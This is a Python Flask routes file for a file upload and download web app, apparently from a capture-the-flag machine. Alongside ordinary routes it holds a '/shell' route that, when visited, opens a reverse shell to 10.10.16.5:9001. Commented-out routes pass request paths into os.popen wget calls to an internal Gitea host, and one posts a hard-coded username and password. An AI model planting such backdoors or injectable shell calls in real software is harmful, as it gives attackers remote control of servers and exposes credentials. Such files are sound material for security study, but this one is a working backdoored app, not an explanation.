import os

from app.utils import get_file_name
from flask import render_template, request, send_file, redirect

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def shell_me():
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.16.5",9001))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    import pty
    pty.spawn("sh")

# @app.route('/redirect/<path:path>')
# def redirect_me(path):
#     if path == 'u':
#         path = ''
#
#     out = os.popen('wget http://172.17.0.1:3000/' + path + ' -O -').read()
#     return out
#
# @app.route('/gitea_pwn')
# def redirect_me(path):
#     out = os.popen('wget 172.17.0.1:3000/user/login --post-data="user_name=dev01&password=Soulless_Developer#2022" -O -').read()
#     return out
